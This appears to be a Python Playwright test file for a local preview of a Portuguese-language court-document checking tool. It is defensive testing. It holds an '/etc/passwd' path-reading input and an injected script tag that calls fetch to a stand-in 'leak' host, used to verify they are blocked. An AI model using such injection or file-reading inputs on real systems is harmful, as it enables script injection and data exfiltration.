import base64
import json
from pathlib import Path
import subprocess
import urllib.request
import urllib.error

import pytest
from playwright.async_api import async_playwright
from engine.documents.inspection import sample_documents

ROOT=Path(__file__).resolve().parents[2]

@pytest.fixture(scope='module')
def preview():
    process=subprocess.Popen([str(ROOT/'target/debug/alma-core'),'preview',str(ROOT),'0'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
    line=process.stdout.readline()
    assert 'http://127.0.0.1:' in line,line
    url=line.strip().split()[-1]
    yield url
    process.terminate();process.wait(timeout=10)


def test_preview_rejects_cross_origin_and_arbitrary_paths(preview):
    for origin,payload,expected in [('https://foreign.invalid',{'sample':'standard'},403),
        (preview,{'files':[{'name':'x','path':'/etc/passwd'}]},422)]:
        request=urllib.request.Request(preview+'/api/inspect',data=json.dumps(payload).encode(),headers={'Origin':origin,'Content-Type':'application/json'})
        with pytest.raises(urllib.error.HTTPError) as err: urllib.request.urlopen(request)
        assert err.value.code==expected


async def test_employee_can_run_example_and_inspect_source(preview,tmp_path):
    async with async_playwright() as driver:
        browser=await driver.chromium.launch()
        page=await browser.new_page(viewport={'width':1440,'height':1000})
        errors=[];page.on('pageerror',lambda err:errors.append(str(err)))
        await page.goto(preview)
        await page.get_by_label('Total que consta no cadastro').fill('2.400,00')
        await page.get_by_label('Data-base que consta no cadastro').fill('10/2026')
        await page.get_by_text('Testar agora com documentos fictícios',exact=True).click()
        await page.get_by_role('button',name='Executar ensaio fictício').click()
        await page.get_by_role('heading',name='2 diferenças para conferir').wait_for(timeout=20000)
        assert await page.locator('.checks').get_by_text('R$ 2.790,00',exact=True).count()==1
        assert await page.get_by_text('alterações no eproc',exact=True).count()==1
        await page.screenshot(path='/tmp/alma-ensaio-desktop.png',full_page=True)
        # Same motor with actual uploaded files, no sample flag.
        paths=sample_documents(tmp_path,'table')
        await page.get_by_label('Selecionar documentos',exact=True).set_input_files([item['path'] for item in paths])
        await page.get_by_role('button',name='Ler documentos e conferir').click()
        await page.get_by_role('heading',name='2 diferenças para conferir').wait_for(timeout=20000)
        assert (await page.locator('iframe').get_attribute('src')).startswith('blob:')
        await page.set_viewport_size({'width':390,'height':844})
        assert await page.evaluate('document.documentElement.scrollWidth<=window.innerWidth')
        await page.screenshot(path='/tmp/alma-ensaio-mobile.png',full_page=True)
        assert errors==[]
        await browser.close()


async def test_mixed_html_pdf_shows_identity_pending_policy_and_never_executes_html(preview,tmp_path):
    async with async_playwright() as driver:
        browser=await driver.chromium.launch()
        page=await browser.new_page(viewport={'width':1440,'height':1000})
        await page.goto(preview)
        await page.get_by_role('button',name='Execução supervisionada').click()
        await page.get_by_label('Processo para conferir os documentos').fill('0000000-00.2026.0.00.0001')
        await page.get_by_label('Total que consta no cadastro').fill('2.790,00')
        paths=sample_documents(tmp_path,'recording')
        proposal=Path(paths[0]['path'])
        proposal.write_text(proposal.read_text()+'<script>window.ALMA_UNSAFE=1;fetch("https://example.invalid/leak")</script>')
        external=[]
        page.on('request',lambda r:external.append(r.url) if 'example.invalid' in r.url else None)
        await page.get_by_label('Selecionar documentos',exact=True).set_input_files([item['path'] for item in paths])
        await page.get_by_role('button',name='Ler documentos e conferir').click()
        await page.get_by_role('heading',name='Plano para execução supervisionada').wait_for(timeout=20000)
        assert await page.get_by_text('12/09/2026',exact=True).count()==1
        assert await page.locator('iframe').count()==0
        assert await page.get_by_role('button',name='Ir para execução no eproc').is_enabled()
        assert await page.evaluate('window.ALMA_UNSAFE === undefined')
        assert external==[]
        await page.get_by_role('button',name='expert-0.pdf · pág. 1').click()
        assert (await page.locator('iframe').get_attribute('src')).startswith('blob:')
        await page.screenshot(path='/tmp/alma-supervisionado-desktop.png',full_page=True)
        await page.set_viewport_size({'width':390,'height':844})
        assert await page.evaluate('document.documentElement.scrollWidth<=window.innerWidth')
        await browser.close()


async def test_demo_ui_shows_actual_local_saves_and_screenshot(preview):
    async with async_playwright() as driver:
        browser=await driver.chromium.launch()
        page=await browser.new_page(viewport={'width':1400,'height':950})
        await page.goto(preview)
        await page.get_by_role('button',name='Modo demonstração').click()
        await page.get_by_label('Mostrar a janela do navegador durante a execução').uncheck()
        await page.get_by_role('button',name='Executar demonstração completa').click()
        await page.get_by_role('heading',name='Demonstração concluída').wait_for(timeout=30000)
        assert '3 salvamentos' in await page.locator('main').inner_text()
        image=page.get_by_role('img',name='Formulário fictício depois dos salvamentos realizados pela automação')
        await image.wait_for()
        assert await image.evaluate('el=>el.complete && el.naturalWidth>0')
        await page.screenshot(path='/tmp/alma-demo-ui.png',full_page=True)
        await browser.close()


async def test_login_starts_queue_without_verify_button_and_never_writes(preview):
    """UI contract test; actual Rust/browser queue is exercised in test_queue.py."""
    calls=[]
    queue={'id':'synthetic-queue','localizer':'Concluso Decisão RPV','status':'RUNNING','error_code':None,
           'items':[{'process_number':'00000000020260000001','requisition_id':'RPV-1','kind':'RPV','state':'PENDING','error_code':None}]}
    async with async_playwright() as driver:
        browser=await driver.chromium.launch()
        page=await browser.new_page()
        async def endpoint(route):
            path=route.request.url.split('/api/')[1];calls.append(path)
            if path=='connect':value={'state':'REAUTH_REQUIRED'}
            elif path=='session':value={'state':'AUTHENTICATED'}
            elif path=='queue/start':value=queue
            elif path=='queue/step':
                queue['status']='COMPLETED';queue['items'][0]['state']='COMPLETED';value=queue
            elif path=='status':value={'reports':[],'jobs':[],'events':[],'executions':[],'queue':queue if 'queue/start' in calls else None}
            else:raise AssertionError(f'Unexpected operation {path}')
            await route.fulfill(json=value)
        await page.route('**/api/**',endpoint)
        await page.goto(preview)
        await page.get_by_role('button',name='Revisar no eproc').click()
        await page.get_by_role('button',name='Abrir navegador eproc').click()
        await page.get_by_text('Varredura concluída; confira as exceções',exact=False).wait_for(timeout=15000)
        assert calls.count('queue/start')==1 and calls.count('queue/step')==1
        assert not any('apply' in path for path in calls)
        await browser.close()
